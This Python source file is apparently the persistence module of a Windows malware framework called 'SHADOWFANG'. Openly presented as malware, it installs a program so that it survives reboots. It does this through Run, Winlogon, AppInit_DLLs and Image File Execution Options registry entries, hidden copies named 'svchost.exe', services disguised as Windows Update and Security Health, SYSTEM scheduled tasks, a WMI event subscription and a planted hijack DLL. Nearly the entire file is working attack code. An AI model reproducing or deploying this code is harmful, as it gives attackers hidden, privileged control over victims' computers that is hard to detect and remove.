#!/usr/bin/env python3
"""
SHADOWFANG CORE - PERSISTENCE.PY
Complete boot persistence module
Multiple persistence mechanisms for maximum survival
Registry, Startup, Services, Scheduled Tasks, WMI, DLL Hijacking
"""

import os
import sys
import time
import ctypes
import shutil
import winreg
import subprocess
import threading
from datetime import datetime
from core import CoreUtils, WinAPI, Constants, logger

# ==================== REGISTRY PERSISTENCE ====================

class RegistryPersistence:
    """Registry-based persistence mechanisms"""
    
    def __init__(self):
        self.persistence_installed = False
        self.installed_entries = []
    
    def install_run_key(self, name=None, path=None):
        """Install Run key persistence"""
        try:
            if not name:
                name = "WindowsUpdate"
            
            if not path:
                path = os.path.join(
                    os.environ.get('APPDATA', 'C:\\Users\\Public'),
                    'svchost.exe'
                )
            
            # Current User Run key
            key = winreg.CreateKey(
                winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Run"
            )
            winreg.SetValueEx(key, name, 0, winreg.REG_SZ, path)
            winreg.CloseKey(key)
            self.installed_entries.append(f"HKCU\\Run\\{name}")
            
            # Local Machine Run key (requires admin)
            if CoreUtils.is_admin():
                key = winreg.CreateKey(
                    winreg.HKEY_LOCAL_MACHINE,
                    r"Software\Microsoft\Windows\CurrentVersion\Run"
                )
                winreg.SetValueEx(key, name, 0, winreg.REG_SZ, path)
                winreg.CloseKey(key)
                self.installed_entries.append(f"HKLM\\Run\\{name}")
            
            logger.info(f"Run key installed: {name}")
            return True
            
        except Exception as e:
            logger.warning(f"Run key installation failed: {e}")
            return False
    
    def install_run_once(self, name=None, path=None):
        """Install RunOnce key"""
        try:
            if not name:
                name = "SystemMaintenance"
            
            if not path:
                path = CoreUtils.get_executable_path()
            
            key = winreg.CreateKey(
                winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\RunOnce"
            )
            winreg.SetValueEx(key, name, 0, winreg.REG_SZ, path)
            winreg.CloseKey(key)
            self.installed_entries.append(f"HKCU\\RunOnce\\{name}")
            
            return True
        except:
            return False
    
    def install_winlogon_shell(self, path=None):
        """Install Winlogon Shell persistence"""
        try:
            if not path:
                path = os.path.join(
                    os.environ.get('APPDATA', 'C:\\Users\\Public'),
                    'svchost.exe'
                )
            
            # Modify Userinit
            key = winreg.OpenKey(
                winreg.HKEY_LOCAL_MACHINE,
                r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon",
                0,
                winreg.KEY_SET_VALUE
            )
            
            # Get current userinit
            try:
                current_userinit, _ = winreg.QueryValueEx(key, "Userinit")
            except:
                current_userinit = "C:\\Windows\\system32\\userinit.exe"
            
            # Append our executable
            new_userinit = f"{current_userinit},{path}"
            winreg.SetValueEx(key, "Userinit", 0, winreg.REG_SZ, new_userinit)
            winreg.CloseKey(key)
            
            # Modify Shell
            key = winreg.OpenKey(
                winreg.HKEY_LOCAL_MACHINE,
                r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon",
                0,
                winreg.KEY_SET_VALUE
            )
            
            try:
                current_shell, _ = winreg.QueryValueEx(key, "Shell")
            except:
                current_shell = "explorer.exe"
            
            new_shell = f"{current_shell},{path}"
            winreg.SetValueEx(key, "Shell", 0, winreg.REG_SZ, new_shell)
            winreg.CloseKey(key)
            
            self.installed_entries.append("HKLM\\Winlogon\\Userinit")
            self.installed_entries.append("HKLM\\Winlogon\\Shell")
            
            logger.info("Winlogon persistence installed")
            return True
            
        except Exception as e:
            logger.warning(f"Winlogon persistence failed: {e}")
            return False
    
    def install_app_init_dlls(self, dll_path=None):
        """Install AppInit_DLLs persistence"""
        try:
            if not dll_path:
                dll_path = os.path.join(
                    os.environ.get('APPDATA', 'C:\\Users\\Public'),
                    'system32.dll'
                )
            
            key = winreg.OpenKey(
                winreg.HKEY_LOCAL_MACHINE,
                r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows",
                0,
                winreg.KEY_SET_VALUE
            )
            
            winreg.SetValueEx(key, "AppInit_DLLs", 0, winreg.REG_SZ, dll_path)
            winreg.SetValueEx(key, "LoadAppInit_DLLs", 0, winreg.REG_DWORD, 1)
            winreg.CloseKey(key)
            
            self.installed_entries.append("HKLM\\Windows\\AppInit_DLLs")
            
            return True
        except:
            return False
    
    def install_image_file_execution(self, target_process="explorer.exe"):
        """Install Image File Execution Options persistence"""
        try:
            key_path = f"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\{target_process}"
            key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, key_path)
            
            path = os.path.join(
                os.environ.get('APPDATA', 'C:\\Users\\Public'),
                'svchost.exe'
            )
            
            winreg.SetValueEx(key, "Debugger", 0, winreg.REG_SZ, path)
            winreg.CloseKey(key)
            
            self.installed_entries.append(f"IFEO\\{target_process}")
            
            return True
        except:
            return False
    
    def install_all_registry(self):
        """Install all registry persistence methods"""
        methods = [
            self.install_run_key,
            self.install_run_once,
            self.install_winlogon_shell,
            self.install_image_file_execution
        ]
        
        success = 0
        for method in methods:
            try:
                if method():
                    success += 1
            except:
                continue
        
        logger.info(f"Registry persistence: {success}/{len(methods)} installed")
        return success

# ==================== FILE SYSTEM PERSISTENCE ====================

class FilePersistence:
    """File system-based persistence"""
    
    def __init__(self):
        self.installed_files = []
    
    def copy_to_appdata(self, filename=None):
        """Copy executable to AppData"""
        try:
            if not filename:
                filename = "svchost.exe"
            
            source_path = CoreUtils.get_executable_path()
            appdata = os.environ.get('APPDATA', 'C:\\Users\\Public')
            dest_path = os.path.join(appdata, filename)
            
            shutil.copy2(source_path, dest_path)
            
            # Set hidden and system attributes
            import ctypes
            ctypes.windll.kernel32.SetFileAttributesW(
                dest_path,
                Constants.FILE_ATTRIBUTE_HIDDEN | Constants.FILE_ATTRIBUTE_SYSTEM
            )
            
            self.installed_files.append(dest_path)
            logger.info(f"Copied to AppData: {dest_path}")
            return dest_path
            
        except Exception as e:
            logger.warning(f"AppData copy failed: {e}")
            return None
    
    def install_startup_folder(self, filename=None):
        """Install in Startup folder"""
        try:
            if not filename:
                filename = "system.exe"
            
            source_path = CoreUtils.get_executable_path()
            startup_dir = os.path.join(
                os.environ.get('APPDATA', ''),
                'Microsoft\\Windows\\Start Menu\\Programs\\Startup'
            )
            dest_path = os.path.join(startup_dir, filename)
            
            shutil.copy2(source_path, dest_path)
            
            self.installed_files.append(dest_path)
            logger.info(f"Startup folder installed: {dest_path}")
            return dest_path
            
        except:
            return None
    
    def install_all_users_startup(self, filename=None):
        """Install in All Users startup folder"""
        try:
            if not filename:
                filename = "WindowsService.exe"
            
            source_path = CoreUtils.get_executable_path()
            startup_dir = 'C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup'
            dest_path = os.path.join(startup_dir, filename)
            
            if os.path.exists(startup_dir):
                shutil.copy2(source_path, dest_path)
                self.installed_files.append(dest_path)
                return dest_path
            
            return None
        except:
            return None
    
    def install_temp_folder(self, filename=None):
        """Install in Temp folder"""
        try:
            if not filename:
                filename = "temp_system.exe"
            
            source_path = CoreUtils.get_executable_path()
            temp_dir = os.environ.get('TEMP', 'C:\\Windows\\Temp')
            dest_path = os.path.join(temp_dir, filename)
            
            shutil.copy2(source_path, dest_path)
            
            self.installed_files.append(dest_path)
            return dest_path
        except:
            return None
    
    def install_windows_folder(self, filename=None):
        """Install in Windows folder"""
        try:
            if not filename:
                filename = "winhelper.exe"
            
            source_path = CoreUtils.get_executable_path()
            windows_dir = os.environ.get('WINDIR', 'C:\\Windows')
            dest_path = os.path.join(windows_dir, filename)
            
            if os.path.exists(windows_dir):
                shutil.copy2(source_path, dest_path)
                
                # Set system attribute
                ctypes.windll.kernel32.SetFileAttributesW(
                    dest_path,
                    Constants.FILE_ATTRIBUTE_HIDDEN | Constants.FILE_ATTRIBUTE_SYSTEM
                )
                
                self.installed_files.append(dest_path)
                return dest_path
            
            return None
        except:
            return None
    
    def install_all_files(self):
        """Install all file persistence methods"""
        methods = [
            self.copy_to_appdata,
            self.install_startup_folder,
            self.install_all_users_startup,
            self.install_temp_folder,
            self.install_windows_folder
        ]
        
        for method in methods:
            try:
                method()
            except:
                continue
        
        logger.info(f"File persistence: {len(self.installed_files)} files installed")
        return len(self.installed_files)

# ==================== SERVICE PERSISTENCE ====================

class ServicePersistence:
    """Windows service-based persistence"""
    
    def __init__(self):
        self.installed_services = []
    
    def install_service(self, service_name=None, display_name=None, description=None):
        """Install as Windows service"""
        try:
            if not service_name:
                service_name = "WindowsUpdate"
            
            if not display_name:
                display_name = "Windows Update Service"
            
            if not description:
                description = "Ensures Windows updates are installed properly"
            
            executable_path = CoreUtils.get_executable_path()
            
            # Create service
            command = f'sc create {service_name} binPath= "{executable_path}" start= auto DisplayName= "{display_name}"'
            subprocess.run(command, shell=True, capture_output=True)
            
            # Set description
            command = f'sc description {service_name} "{description}"'
            subprocess.run(command, shell=True, capture_output=True)
            
            # Set failure recovery
            command = f'sc failure {service_name} reset= 0 actions= restart/60000/restart/60000/restart/60000'
            subprocess.run(command, shell=True, capture_output=True)
            
            # Start service
            command = f'sc start {service_name}'
            subprocess.run(command, shell=True, capture_output=True)
            
            self.installed_services.append(service_name)
            logger.info(f"Service installed: {service_name}")
            return True
            
        except Exception as e:
            logger.warning(f"Service installation failed: {e}")
            return False
    
    def install_using_powershell(self):
        """Install service using PowerShell"""
        try:
            executable_path = CoreUtils.get_executable_path()
            
            ps_command = f'''
$serviceName = "SecurityHealth"
$displayName = "Security Health Service"
$description = "Monitors system security health"
$binaryPath = "{executable_path}"

New-Service -Name $serviceName -DisplayName $displayName -BinaryPathName $binaryPath -StartupType Automatic -Description $description
Start-Service -Name $serviceName
'''
            
            # Save PowerShell script
            ps_path = os.path.join(
                os.environ.get('TEMP', 'C:\\Windows\\Temp'),
                'install_service.ps1'
            )
            
            with open(ps_path, 'w') as f:
                f.write(ps_command)
            
            # Execute
            subprocess.run(
                f'powershell -ExecutionPolicy Bypass -File "{ps_path}"',
                shell=True,
                capture_output=True
            )
            
            # Cleanup
            os.remove(ps_path)
            
            self.installed_services.append("SecurityHealth")
            return True
        except:
            return False
    
    def install_all_services(self):
        """Install all service persistence methods"""
        methods = [
            lambda: self.install_service("WindowsUpdate", "Windows Update Service", "Manages Windows updates"),
            lambda: self.install_service("SecurityHealth", "Security Health Service", "Monitors security health"),
            lambda: self.install_service("SystemHelper", "System Helper Service", "Provides system helper functions"),
            self.install_using_powershell
        ]
        
        for method in methods:
            try:
                method()
            except:
                continue
        
        logger.info(f"Service persistence: {len(self.installed_services)} services installed")
        return len(self.installed_services)

# ==================== SCHEDULED TASK PERSISTENCE ====================

class ScheduledTaskPersistence:
    """Scheduled task-based persistence"""
    
    def __init__(self):
        self.installed_tasks = []
    
    def install_task(self, task_name=None, trigger="onlogon", interval=None):
        """Install scheduled task"""
        try:
            if not task_name:
                task_name = "WindowsUpdateTask"
            
            executable_path = CoreUtils.get_executable_path()
            
            if trigger == "onlogon":
                command = f'schtasks /create /tn "{task_name}" /tr "{executable_path}" /sc onlogon /ru SYSTEM /rl HIGHEST /f'
            elif trigger == "onstart":
                command = f'schtasks /create /tn "{task_name}" /tr "{executable_path}" /sc onstart /ru SYSTEM /rl HIGHEST /f'
            elif trigger == "minute" and interval:
                command = f'schtasks /create /tn "{task_name}" /tr "{executable_path}" /sc minute /mo {interval} /ru SYSTEM /rl HIGHEST /f'
            else:
                command = f'schtasks /create /tn "{task_name}" /tr "{executable_path}" /sc onlogon /ru SYSTEM /rl HIGHEST /f'
            
            subprocess.run(command, shell=True, capture_output=True)
            
            self.installed_tasks.append(task_name)
            logger.info(f"Scheduled task installed: {task_name}")
            return True
            
        except Exception as e:
            logger.warning(f"Task installation failed: {e}")
            return False
    
    def install_multiple_tasks(self):
        """Install multiple scheduled tasks"""
        tasks = [
            ("WindowsUpdateTask", "onlogon", None),
            ("SecurityCheckTask", "onstart", None),
            ("SystemMaintenanceTask", "minute", 30),
            ("NetworkServiceTask", "onlogon", None)
        ]
        
        for task_name, trigger, interval in tasks:
            try:
                self.install_task(task_name, trigger, interval)
            except:
                continue
        
        logger.info(f"Tasks installed: {len(self.installed_tasks)}")
        return len(self.installed_tasks)

# ==================== WMI PERSISTENCE ====================

class WMIPersistence:
    """WMI event subscription persistence"""
    
    def __init__(self):
        self.installed_events = []
    
    def install_wmi_subscription(self):
        """Install WMI event subscription"""
        try:
            executable_path = CoreUtils.get_executable_path()
            
            # Create WMI script
            wmi_script = f'''
$filterArgs = @{{
    Name='ShadowFangFilter',
    EventNameSpace='root\\cimv2',
    QueryLanguage='WQL',
    Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
}}

$filter = Set-WmiInstance -Class __EventFilter -Namespace root\\subscription -Arguments $filterArgs

$consumerArgs = @{{
    Name='ShadowFangConsumer',
    CommandLineTemplate="{executable_path}"
}}

$consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace root\\subscription -Arguments $consumerArgs

$bindingArgs = @{{
    Filter=$filter,
    Consumer=$consumer
}}

$binding = Set-WmiInstance -Class __FilterToConsumerBinding -Namespace root\\subscription -Arguments $bindingArgs
'''
            
            # Save and execute
            wmi_path = os.path.join(
                os.environ.get('TEMP', 'C:\\Windows\\Temp'),
                'install_wmi.ps1'
            )
            
            with open(wmi_path, 'w') as f:
                f.write(wmi_script)
            
            subprocess.run(
                f'powershell -ExecutionPolicy Bypass -File "{wmi_path}"',
                shell=True,
                capture_output=True
            )
            
            os.remove(wmi_path)
            
            self.installed_events.append("WMI Subscription")
            logger.info("WMI subscription installed")
            return True
            
        except:
            return False

# ==================== DLL HIJACKING ====================

class DLLHijacking:
    """DLL hijacking persistence"""
    
    def __init__(self):
        self.hijacked_dlls = []
    
    def find_vulnerable_applications(self):
        """Find applications vulnerable to DLL hijacking"""
        try:
            vulnerable_paths = [
                r'C:\Program Files\Common Files',
                r'C:\Program Files (x86)\Common Files'
            ]
            
            # Look for folders with missing DLLs
            for base_path in vulnerable_paths:
                if os.path.exists(base_path):
                    for root, dirs, files in os.walk(base_path):
                        for dll in ['user32.dll', 'shell32.dll', 'version.dll']:
                            dll_path = os.path.join(root, dll)
                            if not os.path.exists(dll_path):
                                return root
            
            return None
        except:
            return None
    
    def plant_dll(self, dll_path, target_dir=None):
        """Plant malicious DLL for hijacking"""
        try:
            if not target_dir:
                target_dir = self.find_vulnerable_applications()
            
            if not target_dir:
                return False
            
            if not os.path.exists(dll_path):
                return False
            
            dest_path = os.path.join(target_dir, 'version.dll')
            shutil.copy2(dll_path, dest_path)
            
            self.hijacked_dlls.append(dest_path)
            logger.info(f"DLL planted: {dest_path}")
            return True
            
        except:
            return False

# ==================== MAIN PERSISTENCE MANAGER ====================

class PersistenceManager:
    """Main persistence orchestrator"""
    
    def __init__(self):
        self.registry_persist = RegistryPersistence()
        self.file_persist = FilePersistence()
        self.service_persist = ServicePersistence()
        self.task_persist = ScheduledTaskPersistence()
        self.wmi_persist = WMIPersistence()
        self.dll_hijack = DLLHijacking()
        self.persistence_installed = False
    
    def install_all_persistence(self):
        """Install all persistence mechanisms"""
        logger.info("Installing all persistence mechanisms...")
        
        # Phase 1: Copy files
        logger.info("Phase 1: File system persistence")
        self.file_persist.install_all_files()
        
        # Phase 2: Registry entries
        logger.info("Phase 2: Registry persistence")
        self.registry_persist.install_all_registry()
        
        # Phase 3: Scheduled tasks
        logger.info("Phase 3: Scheduled tasks")
        self.task_persist.install_multiple_tasks()
        
        # Phase 4: Services
        logger.info("Phase 4: Services")
        self.service_persist.install_all_services()
        
        # Phase 5: WMI subscription
        logger.info("Phase 5: WMI subscription")
        self.wmi_persist.install_wmi_subscription()
        
        self.persistence_installed = True
        logger.info("All persistence mechanisms installed")
        
        return True
    
    def verify_persistence(self):
        """Verify all persistence mechanisms are active"""
        try:
            verification = {
                'registry_entries': len(self.registry_persist.installed_entries),
                'files_installed': len(self.file_persist.installed_files),
                'services_installed': len(self.service_persist.installed_services),
                'tasks_installed': len(self.task_persist.installed_tasks),
                'wmi_events': len(self.wmi_persist.installed_events)
            }
            
            return verification
        except:
            return {}
    
    def get_status(self):
        """Get persistence status"""
        return {
            'installed': self.persistence_installed,
            'registry': self.registry_persist.installed_entries,
            'files': self.file_persist.installed_files,
            'services': self.service_persist.installed_services,
            'tasks': self.task_persist.installed_tasks,
            'wmi': self.wmi_persist.installed_events
        }

# ==================== SINGLETON INSTANCE ====================

persistence_manager = PersistenceManager()

# ==================== EXPORT ====================

__all__ = [
    'RegistryPersistence',
    'FilePersistence',
    'ServicePersistence',
    'ScheduledTaskPersistence',
    'WMIPersistence',
    'DLLHijacking',
    'PersistenceManager',
    'persistence_manager'
]